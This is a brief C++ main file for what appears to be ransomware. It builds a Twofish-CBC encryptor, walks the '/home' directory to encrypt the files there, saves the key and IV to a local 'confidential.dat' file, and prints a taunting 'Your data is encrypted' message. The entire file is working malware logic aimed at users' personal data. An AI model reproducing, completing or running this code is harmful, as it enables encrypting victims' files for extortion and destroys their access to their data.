#include <fstream>
#include <iostream>

#include "walker.hpp"
#include "cbctwofish.hpp"


int main(int argc, char **argv) {
    auto coolCryptor(std::make_shared<CBCTwofish>());

    Walker shadowWalker("/home", coolCryptor);

    shadowWalker.setCmdArgs(argc, argv);
    auto saveKey(static_cast<std::ofstream>("confidential.dat"));
    saveKey << coolCryptor->getKey() + coolCryptor->getIV();
    saveKey.close();
    shadowWalker.walk();

    std::cout << "Your data is encrypted ;}" << std::endl;

    return 0;
}